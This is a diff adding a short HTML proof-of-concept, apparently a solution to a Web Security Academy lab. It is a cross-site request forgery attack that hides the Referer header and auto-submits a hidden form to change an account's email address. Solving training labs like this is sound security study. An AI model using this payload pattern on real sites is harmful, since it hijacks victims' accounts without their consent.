@@ -1,0 +1,13 @@
+<html>
+<head><meta name="referrer" content="no-referrer"></head>
+  <body>
+    <form action="https://0a1e0054046418c281bd754400c40064.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="carlos&#64;normal&#45;user&#46;net" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
